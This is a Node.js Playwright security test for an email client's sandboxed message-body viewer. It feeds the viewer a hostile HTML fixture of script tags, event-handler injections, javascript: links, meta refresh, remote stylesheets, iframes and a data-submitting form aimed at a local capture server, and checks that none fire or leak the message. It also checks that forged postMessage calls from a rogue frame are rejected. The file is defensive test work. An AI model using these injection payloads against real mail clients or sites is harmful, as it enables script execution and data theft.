// The production body shell, headers and source against separate HTTP origins.
// Hostile HTML must remain inert and remote content requires an explicit load.
const {test}=require('node:test');
const assert=require('node:assert/strict');
const {createServer}=require('node:http');
const {readFileSync}=require('node:fs');
const {resolve}=require('node:path');
const {chromium}=require('playwright');
const PUBLIC=resolve(__dirname,'../email/public');
const listen=async handler=>{const server=createServer(handler);await new Promise(r=>server.listen(0,'127.0.0.1',r));return {server,origin:'http://127.0.0.1:'+server.address().port,close:()=>new Promise(r=>server.close(r))};};
test('hostile Mail HTML cannot execute, navigate, submit or fetch remote resources before explicit image loading',async()=>{
 const hits=[],messages=[];let mail,hub,browser;
 const evil=await listen((req,res)=>{hits.push(req.url);res.writeHead(200,{'Content-Type':'image/png'});res.end(Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+jRZkAAAAASUVORK5CYII=','base64'));});
 try{
  const hostile=`<p id="safe">PRIVATE-MESSAGE</p><script>parent.parent.__pwned=1;fetch('${evil.origin}/script')</script>
   <img src="x" onerror="parent.parent.__pwned=2"><a id="js" href="javascript:parent.parent.__pwned=3">Script</a>
   <svg onload="parent.parent.__pwned=4"><a href="javascript:parent.parent.__pwned=5">SVG</a></svg>
   <meta http-equiv="refresh" content="0;url=${evil.origin}/refresh"><base href="${evil.origin}/base/">
   <link rel="stylesheet" href="${evil.origin}/sheet.css"><link rel="preconnect" href="${evil.origin}">
   <iframe src="${evil.origin}/frame"></iframe><object data="${evil.origin}/object"></object>
   <form action="${evil.origin}/form"><input name="private" value="PRIVATE-MESSAGE"><button id="submit">Submit</button></form>
   <div style="background:url(${evil.origin}/css.png)">Background</div><img src="${evil.origin}/pic.png">
   <a id="mailto" href="mailto:friend@example.com?subject=Hello">Write</a>`;
  const {serveBody}=await import('../email/src/body.js');
  const env={ASSETS:{fetch:async req=>{const p=new URL(req.url).pathname,file=p==='/body/'?'body/index.html':p.slice(1);return new Response(readFileSync(resolve(PUBLIC,file)),{headers:{'Content-Type':p.endsWith('.js')?'text/javascript':p.endsWith('.css')?'text/css':'text/html'}});}}};
  mail=await listen(async(req,res)=>{
   if(req.url.startsWith('/api/messages/')){res.writeHead(200,{'Content-Type':'application/json','Cache-Control':'no-store'});res.end(JSON.stringify({html:hostile,text:''}));return;}
   const out=await serveBody(new Request(mail.origin+req.url),env,[hub.origin]);res.writeHead(out.status,Object.fromEntries(out.headers));res.end(Buffer.from(await out.arrayBuffer()));
  });
  hub=await listen((req,res)=>{res.writeHead(200,{'Content-Type':'text/html'});res.end('<!doctype html><title>Private hub</title><iframe id="mail" sandbox="allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox" referrerpolicy="no-referrer"></iframe>');});
  browser=await chromium.launch({executablePath:process.env.CHROMIUM,args:['--no-sandbox']});
  const page=await browser.newPage();await page.exposeFunction('heard',d=>messages.push(d));await page.goto(hub.origin);
  await page.evaluate(({mail,hub})=>{window.__pwned=0;addEventListener('message',e=>{if(e.origin===mail&&e.source===document.getElementById('mail').contentWindow)window.heard(e.data);});document.getElementById('mail').src=mail+'/body/#'+new URLSearchParams({m:'message1',t:'light',img:'0',p:hub});},{mail:mail.origin,hub:hub.origin});
  const shell=page.frameLocator('#mail'),inner=shell.frameLocator('#b iframe');await inner.locator('#safe').waitFor();
  await page.waitForTimeout(250);
  assert.deepEqual(hits,[],'remote images, CSS, scripts, frame, object and metadata must remain blocked');
  assert.equal(await page.evaluate(()=>window.__pwned),0);assert.equal(page.url(),hub.origin+'/');
  assert.equal(await page.locator('#mail').evaluate(el=>el.contentDocument),null,'hub cannot read Mail DOM');
  const frame=await shell.locator('#b iframe').getAttribute('sandbox');assert.doesNotMatch(frame,/allow-scripts/);
  await inner.locator('#submit').click();await inner.locator('#js').click();await page.waitForTimeout(100);
  assert.deepEqual(hits,[]);assert.equal(await page.evaluate(()=>window.__pwned),0);
  assert.ok(messages.some(d=>d.ifl==='mailbody'&&d.id==='message1'&&typeof d.h==='number'));
  assert.ok(messages.every(d=>!JSON.stringify(d).includes('PRIVATE-MESSAGE')),'only metadata crosses the Mail boundary');
  const shellFrame=page.frames().find(f=>f.url().startsWith(mail.origin+'/body/'));
  await shellFrame.evaluate(mail=>window.postMessage({ifl:'mailbody',v:1,t:'dark'},mail),mail.origin);
  await page.evaluate(()=>{const rogue=document.createElement('iframe');rogue.name='rogue';document.body.append(rogue);});
  const rogue=page.frame({name:'rogue'});assert.ok(rogue);
  await rogue.evaluate(mail=>parent.document.getElementById('mail').contentWindow.postMessage({ifl:'mailbody',v:1,t:'dark'},mail),mail.origin);
  await page.waitForTimeout(100);assert.equal(await shell.locator('html').getAttribute('data-t'),'light','forged window/sibling messages cannot change the shell');
  await page.evaluate(({mail})=>document.getElementById('mail').contentWindow.postMessage({ifl:'mailbody',v:1,t:'dark'},mail),{mail:mail.origin});
  await shell.locator('html[data-t="dark"]').waitFor();
  await page.evaluate(()=>{const el=document.getElementById('mail'),u=new URL(el.src),q=new URLSearchParams(u.hash.slice(1));q.set('img','1');u.hash=q;el.src=u.href;});
  await inner.locator('#safe').waitFor();await page.waitForFunction(()=>document.getElementById('mail').src.includes('img=1'));
  await page.waitForTimeout(300);
  assert.ok(hits.includes('/pic.png'));assert.ok(hits.includes('/css.png'));assert.ok(hits.every(p=>p==='/pic.png'||p==='/css.png'),JSON.stringify(hits));
  assert.equal(await page.evaluate(()=>window.__pwned),0);
 }finally{await browser?.close();await hub?.close();await mail?.close();await evil.close();}
});
